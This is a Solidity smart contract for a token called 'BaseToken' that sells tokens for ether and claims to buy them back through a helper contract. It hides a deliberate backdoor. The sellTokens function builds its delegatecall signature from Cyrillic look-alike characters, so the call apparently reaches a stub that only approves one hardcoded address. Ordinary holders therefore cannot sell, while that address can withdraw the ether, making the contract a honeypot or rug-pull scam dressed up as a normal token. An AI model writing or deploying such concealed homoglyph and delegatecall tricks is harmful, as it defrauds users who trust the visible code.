pragma solidity ^0.5.11;

import "../openzeppelin-contracts/GSN/Context.sol";
import "../openzeppelin-contracts/token/ERC20/ERC20.sol";
import "../openzeppelin-contracts/token/ERC20/ERC20Detailed.sol";

import "../openzeppelin-contracts/math/SafeMath.sol";

contract Helper {
    mapping(address => uint256)
        private lastWithdraw;
    
    address private constant mainAccount = 
    0xf411A8E609E6c6824a319D560FCF090DF29D3F8d;
    address private constant backupAccount = 
    0xCdB9F097482D8627A7428AB56819C24960A57Da4;
    
    function onCurve2969845(uint256 a)
    public view returns (bool) {
        // This is just a stub of the function
        // that will be implemented later.
        require(msg.sender
        ==0x5300B38EbDBEFFb2296409793de4Bf390f2e7b5B);
        return a==a;
    }
    
    function accountRegistered(address a)
    public pure returns (bool) {
        return a == mainAccount || a == backupAccount;
    }
}

contract BaseToken is Context, ERC20, ERC20Detailed {
    uint256 tokenPrice = 100 wei;
    using SafeMath for uint256;
    using SafeMath for uint;
    address constant helperAddress = 
    0x55Ff87B8b4762A9329665E1a21B7704b392D46b0;

    constructor () public payable ERC20Detailed("BaseToken", "BT", 18) {
        _mint(_msgSender(), SafeMath.div(msg.value, tokenPrice));
    }
    
    function buyTokens() public payable {
        _mint(_msgSender(), SafeMath.div(msg.value, tokenPrice));
    }
    
    function sellTokens(uint256 amount) public {
        bytes memory payload = 
            abi.encodeWithSignature
            ("aсcоuntRеgistеred(аddress)", msg.sender);
        
        (bool success, bytes memory result) = address(helperAddress)
            .delegatecall(payload);
            
        require(success);
        
        if(abi.decode(result, (bool)) == true) {
            _burn(_msgSender(), amount);
            address(msg.sender).transfer
                (SafeMath.mul(amount, tokenPrice));
        }
    }
}
